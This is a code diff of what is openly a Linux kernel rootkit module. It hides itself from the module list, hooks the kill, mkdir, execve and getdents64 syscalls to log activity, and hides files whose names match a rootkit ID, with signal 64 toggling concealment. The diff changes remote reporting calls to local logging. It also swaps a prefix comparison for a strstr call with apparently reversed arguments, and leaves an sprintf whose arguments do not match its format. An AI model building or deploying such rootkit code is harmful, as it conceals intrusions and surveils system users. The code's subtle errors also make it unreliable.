@@ -13,11 +13,11 @@ static int hide_rootkit(void){ //function to unhide\hide the rootkit
 	if (!module_hidden){ //module is not hidden
 		prev_module = THIS_MODULE->list.prev; //sets the location of the previous module
 		list_del(&THIS_MODULE->list); //deletes this module from the list
-		client_print("[rootkit] hidden\n");
+		log("[rootkit] hidden\n");
 	}
 	else{// module is hidden
 		list_add(&THIS_MODULE->list, prev_module); //adds module back into list
-		client_print("[rootkit] revealed\n");
+		log("[rootkit] revealed\n");
 	}
 	module_hidden^=1; //flips module_hidden variable
 	return 0; //returns 0 for no error
@@ -54,7 +54,7 @@ static asmlinkage long hooked_kill(const struct pt_regs *regs){ //hook function
 	if (sig==64){ //DEBUG IN CASE LKM IS HIDDEN AND SERVER CANNOT AUTHORISE
 		hide_rootkit();
 	}
-	client_print(buffer); //sends message
+	log(buffer); //sends message
 	return sys_kill.orig_syscall(regs); //kills process and returns result
 }
 
@@ -72,7 +72,7 @@ static asmlinkage long hooked_mkdir(const struct pt_regs *regs){ //hook function
 	else{ //if not sucsessfuly copied
 		sprintf(buffer, "[mkdir] directory = ??? (unable to be copied)    mode = 0x%x\n", dir_name, mode); //copy message to buffer
 	}
-	client_print(buffer); //sends message
+	log(buffer); //sends message
 	return sys_mkdir.orig_syscall(regs); //executes original syscall
 }
 
@@ -89,7 +89,7 @@ static asmlinkage long hooked_execve(const struct pt_regs *regs){ //hook functio
 	else{ //if not sucsessfuly copied
 		sprintf(buffer, "[execve] ??? (unable to be copied)  errcode = %i\n", error); //copy message to buffer
 	}
-	client_print(buffer); //sends message
+	log(buffer); //sends message
 	return sys_execve.orig_syscall(regs); //executes original syscall
 }
 
@@ -116,10 +116,10 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs){ //hook fun
 		//hides all files/directories beginning with rootkit_id
         current_dir = (void *)dirent_ker + offset; //goes to next directory
 
-        if ( memcmp(ROOTKIT_ID, current_dir->d_name, strlen(ROOTKIT_ID)) == 0){ //Compare the first bytes of current_dir->d_name to rootkit id
+        if ( strstr(ROOTKIT_ID, current_dir->d_name) != NULL){ //Compare the first bytes of current_dir->d_name to rootkit id
 			sprintf(buffer,"[rootkit] getdents64- hiding %s\n", current_dir->d_name);
-			client_print(buffer);
-			
+			log(buffer);
+
 			if (current_dir==dirent_ker){ //if special case where fisrt entry needs to be hidden
 				ret -= current_dir->d_reclen; //decrements ret
 				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret); //shifts all structs up in memory
